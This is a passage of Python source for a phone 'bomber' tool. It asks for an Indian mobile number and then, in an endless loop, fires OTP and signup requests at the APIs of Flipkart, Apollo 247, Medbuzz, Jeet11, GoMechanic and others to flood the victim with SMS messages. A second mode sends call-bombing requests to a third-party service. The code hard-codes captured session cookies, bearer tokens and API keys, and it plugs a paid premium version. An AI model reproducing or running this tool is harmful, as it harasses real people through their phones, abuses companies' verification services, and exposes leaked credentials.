ok1 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the password : "+r)\n            sl = Samay(ok,ok1)\n            sl.Passwordencrypt()\nclass Mainscript:\n    def __init__(self,_sek_inp):\n        self.data_main = _sek_inp\n    def scripting(self):\n        if self.data_main==1:\n            _cls_front_under()\n            number = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)\n            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number+r)\n            \n            def simplehacker():\n                url877 = f\'https://simplehacker.pythonanywhere.com/sms/{number}\'\n                ousimple = requests.get(url877)\n            \n            def medbuzz():\n                headers455 = {\n                    \'Accept\': \'application/json, text/plain, */*\',\n                    \'Accept-Language\': \'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5\',\n                    \'Connection\': \'keep-alive\',\n                    # Already added when you pass json=\n                    # \'Content-Type\': \'application/json\',\n                    \'DNT\': \'1\',\n                    \'Origin\': \'https://www.medbuzz.in\',\n                    \'Referer\': \'https://www.medbuzz.in/\',\n                    \'Sec-Fetch-Dest\': \'empty\',\n                    \'Sec-Fetch-Mode\': \'cors\',\n                    \'Sec-Fetch-Site\': \'same-site\',\n                    \'User-Agent\': \'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1\',\n                }\n\n                json_data455 = {\n                    \'CountryCode\': \'+91\',\n                    \'PhoneNumber\': number,\n                    \'ApiKey\': \'fbfc0125-fea6-4ab0-a919-fb01785c1457\',\n                    \'USERID\': \'\',\n                    \'SessionID\': \'\',\n                }\n                response455 = requests.post(\'https://api.medbuzz.in/app/Generate_User_OTP\', headers=headers455, json=json_data455)\n\n            def apollo():\n                headers555 = {\n                    \'Accept-Language\': \'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5\',\n                    \'Connection\': \'keep-alive\',\n                    \'DNT\': \'1\',\n                    \'Origin\': \'https://www.apollopharmacy.in\',\n                    \'Referer\': \'https://www.apollopharmacy.in/\',\n                    \'Sec-Fetch-Dest\': \'empty\',\n                    \'Sec-Fetch-Mode\': \'cors\',\n                    \'Sec-Fetch-Site\': \'cross-site\',\n                    \'User-Agent\': \'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1\',\n                    \'accept\': \'*/*\',\n                    \'authorization\': \'Bearer 3d1833da7020e0602165529446587434\',\n                    # Already added when you pass json=\n                    # \'content-type\': \'application/json\',\n                }\n\n                json_data555 = {\n                    \'operationName\': \'Login\',\n                    \'variables\': {\n                        \'mobileNumber\': f\'+91{number}\',\n                        \'loginType\': \'PATIENT\',\n                    },\n                    \'query\': \'query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n\',\n                }\n\n                response555 = requests.post(\'https://webapi.apollo247.com/\', headers=headers555, json=json_data555)\n\n            def flipkart():\n                cookies11 = {\n                    \'T\': \'TI166051777263500361725355184726229621803065293637887642574388860456\',\n                    \'SN\': \'VI9F4398DB200245EFB45DDABB60763A5F.TOKE8F2773347064BEA8B89703E6443BE39.1660517772.LO\',\n                    \'AMCV_17EB401053DAF4840A490D4C%40AdobeOrg\': \'-227196251%7CMCIDTS%7C19219%7CMCMID%7C07813909948777340084014996032482903537%7CMCAID%7CNONE%7CMCOPTOUT-1660524980s%7CNONE\',\n                    \'gpv_pn\': \'HomePage\',\n                    \'gpv_pn_t\': \'FLIPKART%3AHomePage\',\n                    \'s_cc\': \'true\',\n                    \'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg\': \'1\',\n                    \'S\': \'d1t12TBtWP3k/Nj8/Pwk/ez9CP9D4s238O0dIrFzOXUTD4a+KvuCEEYXRfJIjDkZEeirRSbBUlhNSy4yj5zq2U/tDGQ==\',\n                    \'s_sq\': \'%5B%5BB%5D%5D\',\n                }\n\n                headers11 = {\n                    \'User-Agent\': \'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\',\n                    \'Accept\': \'*/*\',\n                    \'Accept-Language\': \'en-US,en;q=0.5\',\n                    # Already added when you pass json=\n                    # \'Content-Type\': \'application/json\',\n                    \'X-User-Agent\': \'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 FKUA/website/42/website/Desktop\',\n                    \'Origin\': \'https://www.flipkart.com\',\n                    \'DNT\': \'1\',\n                    \'Sec-Fetch-Dest\': \'empty\',\n                    \'Sec-Fetch-Mode\': \'cors\',\n                    \'Sec-Fetch-Site\': \'same-site\',\n                    \'Referer\': \'https://www.flipkart.com/\',\n                    \'Connection\': \'keep-alive\',\n                    # Requests sorts cookies= alphabetically\n                    # \'Cookie\': \'T=TI166051777263500361725355184726229621803065293637887642574388860456; SN=VI9F4398DB200245EFB45DDABB60763A5F.TOKE8F2773347064BEA8B89703E6443BE39.1660517772.LO; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C19219%7CMCMID%7C07813909948777340084014996032482903537%7CMCAID%7CNONE%7CMCOPTOUT-1660524980s%7CNONE; gpv_pn=HomePage; gpv_pn_t=FLIPKART%3AHomePage; s_cc=true; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; S=d1t12TBtWP3k/Nj8/Pwk/ez9CP9D4s238O0dIrFzOXUTD4a+KvuCEEYXRfJIjDkZEeirRSbBUlhNSy4yj5zq2U/tDGQ==; s_sq=%5B%5BB%5D%5D\',\n                }\n\n                json_data11 = {\n                    \'loginId\': \'\',\n                }\n\n                json_data11[\'loginId\'] = (f\'+91{number}\')\n                \n                response11 = requests.post(\'https://2.rome.api.flipkart.com/api/7/user/otp/generate\', cookies=cookies11, headers=headers11, json=json_data11)\n            \n            \n                \n            def fastpronumber():\n                cookies10 = {\n                    \'cf_clearance\': \'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150\',\n                    \'_pk_id.376245.6a19\': \'3f6ba316cc7c0364.1660033473.\',\n                }\n\n                headers10 = {\n                    \'User-Agent\': \'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\',\n                    \'Accept\': \'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\',\n                    \'Accept-Language\': \'en-US,en;q=0.5\',\n                    \'DNT\': \'1\',\n                    \'Connection\': \'keep-alive\',\n                    # Requests sorts cookies= alphabetically\n                    # \'Cookie\': \'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.\',\n                    \'Upgrade-Insecure-Requests\': \'1\',\n                    \'Sec-Fetch-Dest\': \'document\',\n                    \'Sec-Fetch-Mode\': \'navigate\',\n                    \'Sec-Fetch-Site\': \'same-origin\',\n                    \'Cache-Control\': \'max-age=0\',\n                    # Requests doesn\'t support trailers\n                    # \'TE\': \'trailers\',\n                }\n\n                params10 = {\n                    \'sr\': number,\n                    \'key\': \'@itztktricks\',\n                    \'submit\': \'Submit Query\',\n                }\n                \n                #\n                response10 = requests.get(\'https://freebomber.ml/tk/sms/bomber.php\', params=params10, cookies=cookies10, headers=headers10)\n                \n                \n            def industrialapi():\n                url = \'https://www.industrybuying.com\'\n                ol = requests.get(url).cookies\n                lsp = ol[\'SERVER\']\n                cookies8 = {\n                    \'SERVER\': lsp,\n                    \'_gid\': \'GA1.2.1210481606.1660515269\',\n                    \'_gat\': \'1\',\n                    \'_gcl_au\': \'1.1.2042821914.1660515269\',\n                    \'ib_referral\': \'UTM\',\n                    \'ib_utm_date_time\': \'Mon Aug 15 2022 03:44:29 GMT+0530 (India Standard Time)\',\n                    \'ib_utm_source\': \'Affiliate\',\n                    \'ib_utm_medium\': \'icubeswire\',\n                    \'ib_utm_campaign\': \'3881_\',\n                    \'ib_activity_time\': \'8-15-2022 3:44:29\',\n                    \'LONG_SESSION_ID\': \'3552db7a-245b-2da6-be4e-1698aca530f6\',\n                    \'__sts\': \'{"sid":1660515270317,"tx":1660515270317,"url":"https%3A%2F%2Fwww.industrybuying.com%2F%3Futm_source%3DAffiliate%26utm_medium%3Dicubeswire%26utm_campaign%3D3881_","pet":1660515270317,"set":1660515270317}\',\n                    \'__stp\': \'{"visit":"new","uuid":"74e35b34-b39f-44d7-84e3-fa54f411a210"}\',\n                    \'_ga\': \'GA1.1.132751137.1660515269\',\n                    \'__stdf\': \'0\',\n                    \'__stgeo\': \'"0"\',\n                    \'__stbpnenable\': \'1\',\n                    \'_fbp\': \'fb.1.1660515271441.504963341\',\n                    \'_hjSessionUser_2975779\': \'eyJpZCI6IjVjZTM1MTY4LWVmOTQtNTQ4YS05ODY5LWI0ZTExM2ZiMWRkMCIsImNyZWF0ZWQiOjE2NjA1MTUyNzEzNTMsImV4aXN0aW5nIjpmYWxzZX0=\',\n                    \'_hjFirstSeen\': \'1\',\n                    \'_hjIncludedInSessionSample\': \'0\',\n                    \'_hjSession_2975779\': \'eyJpZCI6IjJmNzdlZGFjLWFmOWUtNGFlNC05YzI0LTk3MmI0MjY3YzJiMSIsImNyZWF0ZWQiOjE2NjA1MTUyNzIxODIsImluU2FtcGxlIjpmYWxzZX0=\',\n                    \'__stat\': \'"BLOCK"\',\n                    \'_ga_YCSK09WVKB\': \'GS1.1.1660515271.1.0.1660515277.0\',\n                }\n\n                headers8 = {\n                    \'authority\': \'www.industrybuying.com\',\n                    \'accept\': \'*/*\',\n                    \'accept-language\': \'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5\',\n                    \'content-type\': \'application/x-www-form-urlencoded; charset=UTF-8\',\n                    # Requests sorts cookies= alphabetically\n                    # \'cookie\': \'SERVER=s1; _gid=GA1.2.1210481606.1660515269; _gat=1; _gcl_au=1.1.2042821914.1660515269; ib_referral=UTM; ib_utm_date_time=Mon Aug 15 2022 03:44:29 GMT+0530 (India Standard Time); ib_utm_source=Affiliate; ib_utm_medium=icubeswire; ib_utm_campaign=3881_; ib_activity_time=8-15-2022 3:44:29; LONG_SESSION_ID=3552db7a-245b-2da6-be4e-1698aca530f6; __sts={"sid":1660515270317,"tx":1660515270317,"url":"https%3A%2F%2Fwww.industrybuying.com%2F%3Futm_source%3DAffiliate%26utm_medium%3Dicubeswire%26utm_campaign%3D3881_","pet":1660515270317,"set":1660515270317}; __stp={"visit":"new","uuid":"74e35b34-b39f-44d7-84e3-fa54f411a210"}; _ga=GA1.1.132751137.1660515269; __stdf=0; __stgeo="0"; __stbpnenable=1; _fbp=fb.1.1660515271441.504963341; _hjSessionUser_2975779=eyJpZCI6IjVjZTM1MTY4LWVmOTQtNTQ4YS05ODY5LWI0ZTExM2ZiMWRkMCIsImNyZWF0ZWQiOjE2NjA1MTUyNzEzNTMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2975779=eyJpZCI6IjJmNzdlZGFjLWFmOWUtNGFlNC05YzI0LTk3MmI0MjY3YzJiMSIsImNyZWF0ZWQiOjE2NjA1MTUyNzIxODIsImluU2FtcGxlIjpmYWxzZX0=; __stat="BLOCK"; _ga_YCSK09WVKB=GS1.1.1660515271.1.0.1660515277.0\',\n                    \'dnt\': \'1\',\n                    \'origin\': \'https://www.industrybuying.com\',\n                    \'referer\': \'https://www.industrybuying.com/?utm_source=Affiliate&utm_medium=icubeswire&utm_campaign=3881_\',\n                    \'sec-fetch-dest\': \'empty\',\n                    \'sec-fetch-mode\': \'cors\',\n                    \'sec-fetch-site\': \'same-origin\',\n                    \'user-agent\': \'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320\',\n                    \'x-requested-with\': \'XMLHttpRequest\',\n                }\n\n                data8 = {\n                    \'username\': number,\n                }\n                response8 = requests.post(\'https://www.industrybuying.com/user/api/send-otp/\', cookies=cookies8, headers=headers8, data=data8)\n\n\n            def snapmint():\n                headers7 = {\n                    \'authority\': \'api.snapmint.com\',\n                    \'accept\': \'*/*\',\n                    \'accept-language\': \'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5\',\n                    # Already added when you pass json=\n                    # \'content-type\': \'application/json\',\n                    \'dnt\': \'1\',\n                    \'origin\': \'https://snapmint.com\',\n                    \'referer\': \'https://snapmint.com/\',\n                    \'sec-fetch-dest\': \'empty\',\n                    \'sec-fetch-mode\': \'cors\',\n                    \'sec-fetch-site\': \'same-site\',\n                    \'user-agent\': \'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320\',\n                }\n\n                json_data7 = {\n                    \'mobile\': number,\n                }\n                response7 = requests.post(\'https://api.snapmint.com/v1/public/sign_up\', headers=headers7, json=json_data7)\n\n            def rummytime():\n                headers6 = {\n                    \'authority\': \'api.rummytime.com\',\n                    \'accept\': \'application/json, text/plain, */*\',\n                    \'accept-language\': \'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5\',\n                    \'content-type\': \'application/json;charset=UTF-8\',\n                    \'dnt\': \'1\',\n                    \'origin\': \'https://www.rummytime.com\',\n                    \'referer\': \'https://www.rummytime.com/\',\n                    \'sec-fetch-dest\': \'empty\',\n                    \'sec-fetch-mode\': \'cors\',\n                    \'sec-fetch-site\': \'same-site\',\n                    \'user-agent\': \'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320\',\n                }\n\n                json_data6 = {\n                    \'mobile\': number,\n                }\n                response6 = requests.post(\'https://api.rummytime.com/api/user/sendAppDownloadLink\', headers=headers6, json=json_data6)\n\n            def rummyapi():\n                cookies5 = {\n                    \'sameSiteNoneSupported\': \'true\',\n                    \'LONG_VISITOR\': \'2787e267-cbdf-4032-8f2d-9645fb1cfec1\',\n                    \'device.info.cookie\': \'{"bv":"104.0.0.0","bn":"Chrome","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}\',\n                    \'SSID\': \'SSID4b721211-5179-48db-9ca2-8cedf600d5c8\',\n                    \'SSIDuser\': \'SSID4b721211-5179-48db-9ca2-8cedf600d5c8%3A0\',\n                    \'ga24x7_pixeltracker\': \'from_page%3Dindex.html%26referrer_url%3Dhttps%253A%252F%252Fwww.google.com%252F\',\n                    \'__utma\': \'3588915.1172103635.1660514286.1660514286.1660514286.1\',\n                    \'__utmc\': \'3588915\',\n                    \'__utmz\': \'3588915.1660514286.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)\',\n                    \'__utmt_pageTracker\': \'1\',\n                    \'__utmb\': \'3588915.1.10.1660514286\',\n                    \'NA_IDVISIT\': \'0d7937d9-8dd9-4bf5-95f5-20f4943a0537\',\n                    \'NA_VISITOR\': \'0d7937d9-8dd9-4bf5-95f5-20f4943a0537\',\n                    \'isLivechat\': \'0\',\n                    \'ga24x7_jsessionid\': \'"SSID4b721211-5179-48db-9ca2-8cedf600d5c8,, "\',\n                    \'hash_parameter\': \'0\',\n                    \'AWSALB\': \'twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g\',\n                    \'AWSALBCORS\': \'twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g\',\n                    \'_ga\': \'GA1.2.1172103635.1660514286\',\n                    \'_gid\': \'GA1.2.482317890.1660514290\',\n                    \'_gat_UA-3610156-1\': \'1\',\n                }\n\n                headers5 = {\n                    \'authority\': \'www.rummycircle.com\',\n                    \'accept\': \'*/*\',\n                    \'accept-language\': \'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5\',\n                    \'cache-control\': \'max-age=0\',\n                    # Already added when you pass json=\n                    # \'content-type\': \'application/json\',\n                    # Requests sorts cookies= alphabetically\n                    # \'cookie\': \'sameSiteNoneSupported=true; LONG_VISITOR=2787e267-cbdf-4032-8f2d-9645fb1cfec1; device.info.cookie={"bv":"104.0.0.0","bn":"Chrome","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}; SSID=SSID4b721211-5179-48db-9ca2-8cedf600d5c8; SSIDuser=SSID4b721211-5179-48db-9ca2-8cedf600d5c8%3A0; ga24x7_pixeltracker=from_page%3Dindex.html%26referrer_url%3Dhttps%253A%252F%252Fwww.google.com%252F; __utma=3588915.1172103635.1660514286.1660514286.1660514286.1; __utmc=3588915; __utmz=3588915.1660514286.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt_pageTracker=1; __utmb=3588915.1.10.1660514286; NA_IDVISIT=0d7937d9-8dd9-4bf5-95f5-20f4943a0537; NA_VISITOR=0d7937d9-8dd9-4bf5-95f5-20f4943a0537; isLivechat=0; ga24x7_jsessionid="SSID4b721211-5179-48db-9ca2-8cedf600d5c8,, "; hash_parameter=0; AWSALB=twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g; AWSALBCORS=twWHmfYRDBfPLrq9WstPEtAY/+Wy45PMjFsBaLKs3gRPu8KJmMp70nDEQWdSEF04CAvl9Hv7eCD07PB9S9Ij9LG0ls/jMqOOu8C3TMtKMFa3Da5Coo1dqe2WWj7g; _ga=GA1.2.1172103635.1660514286; _gid=GA1.2.482317890.1660514290; _gat_UA-3610156-1=1\',\n                    \'dnt\': \'1\',\n                    \'origin\': \'https://www.rummycircle.com\',\n                    \'referer\': \'https://www.rummycircle.com/\',\n                    \'sec-ch-ua\': \'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"\',\n                    \'sec-ch-ua-mobile\': \'?1\',\n                    \'sec-ch-ua-platform\': \'"Android"\',\n                    \'sec-fetch-dest\': \'empty\',\n                    \'sec-fetch-mode\': \'cors\',\n                    \'sec-fetch-site\': \'same-origin\',\n                    \'user-agent\': \'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36\',\n                }\n\n                json_data5 = {\n                    \'mobile\': number,\n                    \'deviceId\': \'ff2e30c7-0998-42c7-b2a7-4293c38bb040\',\n                    \'deviceName\': \'\',\n                    \'refCode\': \'\',\n                    \'isPlaycircle\': False,\n                }\n                response5 = requests.post(\'https://www.rummycircle.com/api/fl/auth/v3/getOtp\', cookies=cookies5, headers=headers5, json=json_data5)\n\n\n\n            def nira():\n                headers4 = {\n                    \'authority\': \'63ti5s0o80.execute-api.ap-south-1.amazonaws.com\',\n                    \'accept\': \'application/json, text/plain, */*\',\n                    \'accept-language\': \'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5\',\n                    # Already added when you pass json=\n                    # \'content-type\': \'application/json\',\n                    \'dnt\': \'1\',\n                    \'origin\': \'https://apply.nirafinance.com\',\n                    \'referer\': \'https://apply.nirafinance.com/\',\n                    \'sec-fetch-dest\': \'empty\',\n                    \'sec-fetch-mode\': \'cors\',\n                    \'sec-fetch-site\': \'cross-site\',\n                    \'user-agent\': \'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320\',\n                }\n\n                json_data4 = {\n                    \'mobileNumber\': number,\n                    \'otp\': \'\',\n                }\n                response4 = requests.post(\'https://63ti5s0o80.execute-api.ap-south-1.amazonaws.com/Prod/nirawebloginapi\', headers=headers4, json=json_data4)\n\n\n\n            def macdonal():\n                headers3 = {\n                    \'Accept\': \'application/json, text/plain, */*\',\n                    \'Accept-Language\': \'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5\',\n                    \'AddressID\': \'0\',\n                    \'Authorization\': \'Token 1e32549b6d6054059d8447d12be42612e31ac6f4af1155473ceb5e940d23649d\',\n                    \'BusinessModelID\': \'18\',\n                    \'CartID\': \'0\',\n                    \'Connection\': \'keep-alive\',\n                    # Already added when you pass json=\n                    # \'Content-Type\': \'application/json\',\n                    \'CustomerID\': \'-1\',\n                    \'DNT\': \'1\',\n                    \'OrderTime\': \'0\',\n                    \'OrderType\': \'R\',\n                    \'Origin\': \'https://www.mcdelivery.co.in\',\n                    \'PlatForm\': \'msite\',\n                    \'Referer\': \'https://www.mcdelivery.co.in/\',\n                    \'Sec-Fetch-Dest\': \'empty\',\n                    \'Sec-Fetch-Mode\': \'cors\',\n                    \'Sec-Fetch-Site\': \'same-site\',\n                    \'Storeid\': \'1\',\n                    \'TokenTimestamp\': \'150820220314\',\n                    \'User-Agent\': \'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36\',\n                    \'newrelic\': \'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5Njk0NDQiLCJhcCI6Ijc1NDEzMDQzNCIsImlkIjoiMDA2YjEwMDQwMzAyMDVlNSIsInRyIjoiMDBjZmQyMGQ1NzgxODJlYjU4MTBjNWMxMmI5NDZkNzAiLCJ0aSI6MTY2MDUxMzQ1MTk5NH19\',\n                    \'sec-ch-ua\': \'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"\',\n                    \'sec-ch-ua-mobile\': \'?1\',\n                    \'sec-ch-ua-platform\': \'"Android"\',\n                    \'source\': \'Web\',\n                }\n\n\n\n\n                params3 = {\n                    \'isLoggedIn\': \'false\',\n                    \'businessModelID\': \'18\',\n                    \'storeID\': \'1\',\n                }\n\n                json_data3 = {\n                    \'MobileNo\': number,\n                }\n                response3 = requests.post(\'https://services.mcdelivery.co.in/api/auth/sendotp\', params=params3, headers=headers3, json=json_data3)\n\n            def jeet():\n                headers2 = {\n                    \'authority\': \'api.jeet11.com\',\n                    \'accept\': \'application/json, text/plain, */*\',\n                    \'accept-language\': \'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5\',\n                    # Already added when you pass json=\n                    # \'content-type\': \'application/json\',\n                    \'dnt\': \'1\',\n                    \'origin\': \'https://www.jeet11.com\',\n                    \'referer\': \'https://www.jeet11.com/\',\n                    \'sec-fetch-dest\': \'empty\',\n                    \'sec-fetch-mode\': \'cors\',\n                    \'sec-fetch-site\': \'same-site\',\n                    \'user-agent\': \'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320\',\n                    \'x-client-app-type\': \'JEET11\',\n                    \'x-header-deviceid\': \'574a1fe8-a63a-421b-90f4-d73d0d276e60\',\n                }\n\n                json_data2 = {\n                    \'phoneNo\': number,\n                    \'countryAreaCode\': \'91\',\n                    \'language\': \'English\',\n                }\n                response2 = requests.post(\'https://api.jeet11.com/account-service/external/v1.0.0/sendOtp\', headers=headers2, json=json_data2)\n\n\n            def gomechanic():\n                headers = {\n                    \'Accept\': \'*/*\',\n                    \'Accept-Language\': \'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5\',\n                    \'Authorization\': \'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYmYiOjE2NjA1MTU2NDAuMCwiaWF0IjoxNjYwNTE1NjQwLjAsImp0aSI6ImI0YmMzY2FmNWQxZWE5OWRjOTZiNDMzY2NjNDMwMjRlMDIzYjQwYzZiNDlmMTE3YmMwOTk4ZjYxZTdkMjVmMzYxNTVhZTlkMjE2MTZlNzk1IiwiZXhwIjoxNjYzMTA3NjQwLjAsImF1ZCI6IjMiLCJzY29wZXMiOltdLCJzdWIiOiIxNjYwNTE1NjQwODcifQ.DvSAJJYe6zUGovXqVK6zs-g7ccYE3O--anVOp-j5L60-Bvt4mXYavcgwUd1R8V-4zqVt-CRhhxUyvI227mCfHe4Jts9To5N-XT9PotfXchxlAZYGegwGs_xpSuFgsbYZYJw4DaQ1wT7d4JtDROyneeqoRUXAwORz78WBetYMT5H_aZGqxK2El7QDFO6vgXP0N7arIsOO8RDH2qT9a02f2R--2KSgtpZhnruA_XHC7ZIHjEC97rkuS-tZQwofgSLmiyJCTrpZjeJM7UF_Pvhq20ftz6VYHMVgsplKvjVDr4KCE7oJkWqt-qAJOVvugPlsW7hjhTDPLQg8MQf9VOuRA-aolE2EU1T1UwVzUSDQJuhYFpwWRmGHug5kgnQR8VjNi_631oPCutsW66fUA4MxYlvEaVzwtImpb0LAApQdnr6frNrXk3W_ARau2cTOXhpo8qk-z4JlA1Mrawgc_pbDYL_TpxMD6d545v6l4NbPTr7aV0IKng3DfAG_7oP_ktp5cngZO7rYvL6ElD4wprFbzob3PiFBwqBaOOmGKJaOMrhqaQhO0-wI6cyHUq4dE5f0lPhphe0WsqzoLfnh2dnAwCKeFeFzIMeCpJfvatzi53I49uLZUBBwJmzKYlUKSbx0jA0q4fCrrniW-gGkcjlv86k-lwUKqHq_2hF4Vr8MrwA\',\n                    \'Connection\': \'keep-alive\',\n                    # Already added when you pass json=\n                    # \'Content-Type\': \'application/json\',\n                    \'DNT\': \'1\',\n                    \'Origin\': \'https://gomechanic.in\',\n                    \'Referer\': \'https://gomechanic.in/\',\n                    \'Sec-Fetch-Dest\': \'empty\',\n                    \'Sec-Fetch-Mode\': \'cors\',\n                    \'Sec-Fetch-Site\': \'cross-site\',\n                    \'User-Agent\': \'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320\',\n                }\n\n                json_data = {\n                    \'name\': \'\',\n                    \'car_type_id\': 115,\n                    \'mobile\': number,\n                    \'location\': \'Gurgaon\',\n                    \'utm_source\': \'\',\n                    \'source_id\': 15,\n                }\n                response = requests.post(\'https://gomechanic.app/api/v1/oauth/leads/create_new_lead\', headers=headers, json=json_data)\n\n\n            try:\n                while True:\n                    flipkart()\n                    jeet()\n                    apollo()\n                    medbuzz()\n                    gomechanic()\n                    #macdonal()\n                    nira()\n                    #fastpronumber()\n                    #industrialapi()\n                    #fastpronumber()\n                    #rummyapi()\n                    #nira()\n                    #rummytime()\n                    #rummyapi()\n                    #snapmint()\n            except:\n                _under_()\n                chutmarike(\'Bombing stopped..\')\n                _under_()\n                sys.exit()\n                \n                \n                \n\n        elif self.data_main==2:\n            _cls_front_under()\n            chutmarike(\'For call , custom msg and fastest api buy the premium script ..\')\n            _under_()\n            chutmarike(\'To buy script contact me on instagram : @sincryptzork\')\n            sys.exit()\n            number2 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)\n            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number2+r)\n            \n            def callphp():\n                #\n                cookies13 = {\n                    \'cf_clearance\': \'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150\',\n                    \'_pk_id.376245.6a19\': \'3f6ba316cc7c0364.1660033473.\',\n                }\n\n                headers13 = {\n                    \'User-Agent\': \'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\',\n                    \'Accept\': \'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\',\n                    \'Accept-Language\': \'en-US,en;q=0.5\',\n                    \'DNT\': \'1\',\n                    \'Connection\': \'keep-alive\',\n                    # Requests sorts cookies= alphabetically\n                    # \'Cookie\': \'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.\',\n                    \'Upgrade-Insecure-Requests\': \'1\',\n                    \'Sec-Fetch-Dest\': \'document\',\n                    \'Sec-Fetch-Mode\': \'navigate\',\n                    \'Sec-Fetch-Site\': \'same-origin\',\n                    \'Cache-Control\': \'max-age=0\',\n                    # Requests doesn\'t support trailers\n                    # \'TE\': \'trailers\',\n                }\n\n                params13 = {\n                    \'sr\': number2,\n                    \'key\': \'@itztktricks\',\n                    \'submit\': \'Submit Query\',\n                }\n\n\n                response13 = requests.get(\'https://freebomber.ml/tk/call/call.php\', params=params13, cookies=cookies13, headers=headers13)\n            try:\n                while True:\n                    callphp()\n                    callphp()\n            except:\n                _under_()\n                chutmarike(\'Call Bombing Stopped ..\')\n                _under_()\n                sys.exit()\n        elif self.data_main==3:\n            _cls_front_under()\n            number98 